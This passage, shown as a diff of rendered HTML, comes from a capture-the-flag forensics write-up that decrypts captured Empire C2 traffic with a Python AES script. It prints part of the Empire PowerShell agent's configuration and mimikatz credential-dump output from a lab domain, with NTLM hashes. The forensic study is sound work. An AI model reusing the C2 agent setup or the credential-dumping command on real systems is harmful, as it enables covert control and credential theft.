+</span></span><span style="display:flex;"><span>[+] AES Decrypted<span style="color:#960050;background-color:#1e0010">:</span> b<span style="color:#e6db74">&#39;C)\x13X\xc2:E\xd1\&#39;</span>\xc6\x84\xcf\xc0!\xd8\x0e\n    <span style="color:#66d9ef">param</span>(\n        [Parameter(<span style="color:#a6e22e">Mandatory</span>=$true)]\n        [<span style="color:#66d9ef">String</span>]\n        $StagingKey,\n        [Parameter(<span style="color:#a6e22e">Mandatory</span>=$true)]\n        [<span style="color:#66d9ef">String</span>]\n        $SessionKey,\n        [Parameter(<span style="color:#a6e22e">Mandatory</span>=$true)]\n        [<span style="color:#66d9ef">String</span>]\n        $SessionID,\n        [<span style="color:#66d9ef">Int32</span>]\n        $AgentDelay = <span style="color:#ae81ff">5</span>,\n        [<span style="color:#66d9ef">Double</span>]\n        $AgentJitter = <span style="color:#ae81ff">0.0</span>,\n        [<span style="color:#66d9ef">String[]</span>]\n        $Servers,\n        [<span style="color:#66d9ef">String</span>]\n        $KillDate,\n        [<span style="color:#66d9ef">Int32</span>]\n        $KillDays,\n        [<span style="color:#66d9ef">String</span>]\n        $WorkingHours,\n        [<span style="color:#66d9ef">object</span>]\n        $ProxySettings,\n        [<span style="color:#66d9ef">String</span>]\n        $Profile = <span style="color:#e6db74">&#34;/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#34;</span>,\n        [<span style="color:#66d9ef">Int32</span>]\n        $LostLimit = <span style="color:#ae81ff">60</span>,\n        [<span style="color:#66d9ef">String</span>]\n        $DefaultResponse = <span style="color:#e6db74">&#34;PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CjxoZWFkPgogICAgPG1ldGEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTEiIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIvPgogICAgPHRpdGxlPjQwNCAtIEZpbGUgb3IgZGlyZWN0b3J5IG5vdCBmb3VuZC48L3RpdGxlPgogICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KPCEtLQpib2R5e21hcmdpbjowO2ZvbnQtc2l6ZTouN2VtO2ZvbnQtZmFtaWx5OlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7YmFja2dyb3VuZDojRUVFRUVFO30KZmllbGRzZXR7cGFkZGluZzowIDE1cHggMTBweCAxNXB4O30gCmgxe2ZvbnQtc2l6ZToyLjRlbTttYXJnaW46MDtjb2xvcjojRkZGO30KaDJ7Zm9udC1zaXplOjEuN2VtO21hcmdpbjowO2NvbG9yOiNDQzAwMDA7fSAKaDN7Zm9udC1zaXplOjEuMmVtO21hcmdpbjoxMHB4IDAgMCAwO2NvbG9yOiMwMDAwMDA7fSAKI2hlYWRlcnt3aWR0aDo5NiU7bWFyZ2luOjAgMCAwIDA7cGFkZGluZzo2cHggMiUgNnB4IDIlO2ZvbnQtZmFtaWx5OiJ0cmVidWNoZXQgTVMiLCBWZXJkYW5hLCBzYW5zLXNlcmlmO2NvbG9yOiNGRkY7CmJhY2tncm91bmQtY29sb3I6IzU1NTU1NTt9CiNjb250ZW50e21hcmdpbjowIDAgMCAyJTtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci5jb250ZW50LWNvbnRhaW5lcntiYWNrZ3JvdW5kOiNGRkY7d2lkdGg6OTYlO21hcmdpbi10b3A6OHB4O3BhZGRpbmc6MTBweDtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci0tPgogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGRpdiBpZD0iaGVhZGVyIj48aDE+U2VydmVyIEVycm9yPC9oMT48L2Rpdj4KPGRpdiBpZD0iY29udGVudCI+CiAgICA8ZGl2IGNsYXNzPSJjb250ZW50LWNvbnRhaW5lciI+CiAgICAgICAgPGZpZWxkc2V0PgogICAgICAgICAgICA8aDI+NDA0IC0gRmlsZSBvciBkaXJlY3Rvcnkgbm90IGZvdW5kLjwvaDI+CiAgICAgICAgICAgIDxoMz5UaGUgcmVzb3VyY2UgeW91IGFyZSBsb29raW5nIGZvciBtaWdodCBoYXZlIGJlZW4gcmVtb3ZlZCwgaGFkIGl0cyBuYW1lIGNoYW5nZWQsIG9yIGlzIHRlbXBvcmFyaWx5CiAgICAgICAgICAgICAgICB1bmF2YWlsYWJsZS48L2gzPgogICAgICAgIDwvZmllbGRzZXQ+CiAgICA8L2Rpdj4KPC9kaXY+CjwvYm9keT4KPC9odG1sPg==&#34;</span>\n    )\n    $Encoding = [<span style="color:#66d9ef">System.Text.Encoding</span>]::ASCII\n    $HMAC = New-Object System.Security.Cryptography.HMACSHA256\n    $script:AgentDelay = $AgentDelay\n    $script:AgentJitter = $AgentJitter\n    $script:LostLimit = $LostLimit\n    $script:MissedCheckins = <span style="color:#ae81ff">0</span>\n    $script:ResultIDs = @{}\n    $script:WorkingHours  -- a lot more --
+</span></span></code></pre></div><p>Although no flag can be seen in the decrypted data, we now have the <code>IV</code> and <code>Key</code> to decrypt all the other packets. There was one HTTP packet that had a huge size so I thought of trying decrypting that. I had some difficulties at first, but eventually modified my decryption to decrypt from the 20th byte onwards and it worked:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># key is the SessionKey we found</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">aes_decrypt</span>(ciphertext, key):
+</span></span><span style="display:flex;"><span>    ciphertext <span style="color:#f92672">=</span> pad(ciphertext, AES<span style="color:#f92672">.</span>block_size)
+</span></span><span style="display:flex;"><span>    iv <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;6486863263721433&#39;</span>
+</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CBC, iv)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># first 20 bytes are metadata encrypted with the RC4 key. Last 10 are HMAC SHA 256 verification data</span>
+</span></span><span style="display:flex;"><span>    plaintext <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(pad(ciphertext[<span style="color:#ae81ff">20</span>:], AES<span style="color:#f92672">.</span>block_size))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> plaintext
+</span></span></code></pre></div><p>Running it, we get:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">─$</span> python aes_decrypt<span style="color:#f92672">.</span>py
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] AES Decrypted: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|It</span><span style="color:#ae81ff">\xbd</span><span style="color:#e6db74">K</span><span style="color:#ae81ff">\x96\xaa</span><span style="color:#e6db74">W_</span><span style="color:#ae81ff">\xd0</span><span style="color:#e6db74">G)</span><span style="color:#ae81ff">\x93\xa8\x0f\xdd</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\x00\x01\x00\x01\x00\x07\x00\xac</span><span style="color:#e6db74">&amp;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">SG9zdG5hbWU6IHNhdGVsbGl0ZS0yMzQxLkNPUlAubG9jYWwgLyBTLTEtNS0yMS0yODg2NDAyNDAtNDE0MzE2MDc3NC00MTkzNDc4MDExDQoKICAuIyMjIyMuICAgbWltaWthdHogMi4yLjAgKHg2NCkgIzE5MDQxIE5vdiAyMCAyMDIxIDA4OjI4OjA2CiAuIyMgXiAjIy4gICJBIExhIFZpZSwgQSBMJ0Ftb3VyIiAtIChvZS5lbykKICMjIC8gXCAjIyAgLyoqKiBCZW5qYW1pbiBERUxQWSBgZ2VudGlsa2l3aWAgKCBiZW5qYW1pbkBnZW50aWxraXdpLmNvbSApCiAjIyBcIC8gIyMgICAgICAgPiBodHRwczovL2Jsb2cuZ2VudGlsa2l3aS5jb20vbWltaWthdHoKICcjIyB2ICMjJyAgICAgICBWaW5jZW50IExFIFRPVVggICAgICAgICAgICAgKCB2aW5jZW50LmxldG91eEBnbWFpbC5jb20gKQogICcjIyMjIycgICAgICAgID4gaHR0cHM6Ly9waW5nY2FzdGxlLmNvbSAvIGh0dHBzOi8vbXlzbWFydGxvZ29uLmNvbSAqKiovCgptaW1pa2F0eihwb3dlcnNoZWxsKSAjIHNla3VybHNhOjpsb2dvbnBhc3N3b3JkcwoKQXV0aGVudGljYXRpb24gSWQgOiAwIDsgMzMyNTUwICgwMDAwMDAwMDowMDA1MTMwNikKU2Vzc2lvbiAgICAgICAgICAgOiBJbnRlcmFjdGl2ZSBmcm9tIDEKVXNlciBOYW1lICAgICAgICAgOiBTYXRBZG1pbmlzdHJhdG9yCkRvbWFpbiAgICAgICAgICAgIDogQ09SUApMb2dvbiBTZXJ2ZXIgICAgICA6IENPUlAtREMKTG9nb24gVGltZSAgICAgICAgOiA4LzMwLzIwMjIgMTI6MzM6MzAgUE0KU0lEICAgICAgICAgICAgICAgOiBTLTEtNS0yMS0yODg2NDAyNDAtNDE0MzE2MDc3NC00MTkzNDc4MDExLTExMTQKCW1zdiA6CQoJIFswMDAwMDAwM10gUHJpbWFyeQoJICogVXNlcm5hbWUgOiBTYXRBZG1pbmlzdHJhdG9yCgkgKiBEb21haW4gICA6IENPUlAKCSAqIE5UTE0gICAgIDogYTlmZGZhMDM4YzRiNzVlYmM3NmRjODU1ZGQ3NGYwZGEKCSAqIFNIQTEgICAgIDogOTQwMGFlMjg0NDhlMTM2NDE3NGRkZTI2OWIyY2NlMWJjYTlkN2VlOAoJICogRFBBUEkgICAgOiBmZDExYWQzZGM0MzMzMTkwMTA5YzE1ZGI5MzFhM2I0YQoJdHNwa2cgOgkKCXdkaWdlc3QgOgkKCSAqIFVzZXJuYW1lIDogU2F0QWRtaW5pc3RyYXRvcgoJICogRG9tYWluICAgOiBDT1JQCgkgKiBQYXNzd29yZCA6IChudWxsKQoJa2VyYmVyb3MgOgkKCSAqIFVzZXJuYW1lIDogU2F0QWRtaW5pc3RyYXRvcgoJICogRG9tYWluICAgOiBDT1JQLkxPQ0FMCgkgKiBQYXNzd29yZCA6IChudWxsKQoJc3NwIDoJCgljcmVkbWFuIDoJCgkgWzAwMDAwMDAwXQoJICogVXNlcm5hbWUgOiBBZG1pbmlzdHJhdG9yCgkgKiBEb21haW4gICA6IGNvcnAtZGMKCSAqIFBhc3N3b3JkIDogSFRCe3RoM18zbXAxcjNfRjFuNGxseV9DMGxsNHBzM2R9CgljbG91ZGFwIDoJCgpBdXRoZW50aWNhdGlvbiBJZCA6IDAgOyAzMzI1MTggKDAwMDAwMDAwOjAwMDUxMmU2KQpTZXNzaW9uICAgICAgICAgICA6IEludGVyYWN0aXZlIGZyb20gMQpVc2VyIE5hbWUgICAgICAgICA6IFNhdEFkbWluaXN0cmF0b3IKRG9tYWluICAgICAgICAgICAgOiBDT1JQCkxvZ29uIFNlcnZlciAgICAgIDogQ09SUC1EQwpMb2dvbiBUaW1lICAgICAgICA6IDgvMzAvMjAyMiAxMjozMzozMCBQTQpTSUQgICAgICAgICAgICAgICA6IFMtMS01LTIxLTI4ODY0MDI0MC00MTQzMTYwNzc0LTQxOTM0NzgwMTEtMTExNAoJbXN2IDoJCgkgWzAwMDAwMDAzXSBQcmltYXJ5CgkgKiBVc2VybmFtZSA6IFNhdEFkbWluaXN0cmF0b3IKCSAqIERvbWFpbiAgIDogQ09SUAoJICogTlRMTSAgICAgOiBhOWZkZmEwMzhjNGI3NWViYzc2ZGM4NTVkZDc0ZjBkYQoJICogU0hBMSAgICAgOiA5NDAwYWUyODQ0OGUxMzY0MTc0ZGRlMjY5YjJjY2UxYmNhOWQ3ZWU4CgkgKiBEUEFQSSAgICA6IGZkMTFhZDNkYzQzMzMxOTAxMDljMTVkYjkzMWEzYjRhCgl0c3BrZyA6CQoJd2RpZ2VzdCA6CQoJICogVXNlcm5hbWUgOiBTYXRBZG1pbmlzdHJhdG9yCgkgKiBEb21haW4gICA6IENPUlAKCSAqIFBhc3N3b3JkIDogKG51bGwpCglrZXJiZXJvcyA6CQoJICogVXNlcm5hbWUgOiBTYXRBZG1pbmlzdHJhdG9yCgkgKiBEb21haW4gICA6IENPUlAuTE9DQUwKCSAqIFBhc3N3b3JkIDogKG51bGwpCglzc3AgOgkKCWNyZWRtYW4gOgkKCSBbMDAwMDAwMDBdCgkgKiBVc2VybmFtZSA6IEFkbWluaXN0cmF0b3IKCSAqIERvbWFpbiAgIDogY29ycC1kYwoJICogUGFzc3dvcmQgOiBIVEJ7dGgzXzNtcDFyM19GMW40bGx5X0MwbGw0cHMzZH0KCWNsb3VkYXAgOgkKCkF1dGhlbnRpY2F0aW9uIElkIDogMCA7IDk5NyAoMDAwMDAwMDA6MDAwMDAzZTUpClNlc3Npb24gICAgICAgICAgIDogU2VydmljZSBmcm9tIDAKVXNlciBOYW1lICAgICAgICAgOiBMT0NBTCBTRVJWSUNFCkRvbWFpbiAgICAgICAgICAgIDogTlQgQVVUSE9SSVRZCkxvZ29uIFNlcnZlciAgICAgIDogKG51bGwpCkxvZ29uIFRpbWUgICAgICAgIDogOC8zMC8yMDIyIDEyOjMzOjE3IFBNClNJRCAgICAgICAgICAgICAgIDogUy0xLTUtMTkKCW1zdiA6CQoJdHNwa2cgOgkKCXdkaWdlc3QgOgkKCSAqIFVzZXJuYW1lIDogKG51bGwpCgkgKiBEb21haW4gICA6IChudWxsKQoJICogUGFzc3dvcmQgOiAobnVsbCkKCWtlcmJlcm9zIDoJCgkgKiBVc2VybmFtZSA6IChudWxsKQoJICogRG9tYWluICAgOiAob -- more bytes --</span>
+</span></span></code></pre></div><p>Decoding the huge b64 blob, we get the flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e6db74">&#39;Hostname: satellite-2341.CORP.local / S-1-5-21-288640240-4143160774-4193478011</span><span style="color:#ae81ff">\r\n\n</span><span style="color:#e6db74">  .#####.   mimikatz 2.2.0 (x64) #19041 Nov 20 2021 08:28:06</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> .## ^ ##.  &#34;A La Vie, A L</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">Amour&#34; - (oe.eo)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> ## / </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> ## </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">## v ##</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">  </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">#####</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">mimikatz(powershell) # sekurlsa::logonpasswords</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">Authentication Id : 0 ; 332550 (00000000:00051306)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Session           : Interactive from 1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">User Name         : SatAdministrator</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Domain            : CORP</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Logon Server      : CORP-DC</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Logon Time        : 8/30/2022 12:33:30 PM</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">SID               : S-1-5-21-288640240-4143160774-4193478011-1114</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">msv :</span><span style="color:#ae81ff">\t\n\t</span><span style="color:#e6db74"> [00000003] Primary</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Username : SatAdministrator</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Domain   : CORP</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * NTLM     : a9fdfa038c4b75ebc76dc855dd74f0da</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * SHA1     : 9400ae28448e1364174dde269b2cce1bca9d7ee8</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * DPAPI    : fd11ad3dc4333190109c15db931a3b4a</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">tspkg :</span><span style="color:#ae81ff">\t\n\t</span><span style="color:#e6db74">wdigest :</span><span style="color:#ae81ff">\t\n\t</span><span style="color:#e6db74"> * Username : SatAdministrator</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Domain   : CORP</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Password : (null)</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">kerberos :</span><span style="color:#ae81ff">\t\n\t</span><span style="color:#e6db74"> * Username : SatAdministrator</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Domain   : CORP.LOCAL</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Password : (null)</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">ssp :</span><span style="color:#ae81ff">\t\n\t</span><span style="color:#e6db74">credman :</span><span style="color:#ae81ff">\t\n\t</span><span style="color:#e6db74"> [00000000]</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Username : Administrator</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Domain   : corp-dc</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74"> * Password : [REDACTED_FLAG]</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">cloudap :</span><span style="color:#ae81ff">\t\n</span><span style="color:#e6db74">&#39;</span>
+</span></span></code></pre></div><p>This is it for this training session.</p>
+
 
   </div>
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/tags/empire-c2/">Empire C2</a></li>
     </ul>
 <nav class="paginav">
   <a class="prev" href="http://localhost:1313/ctfwriteups/chinesewindowsupgrader/">
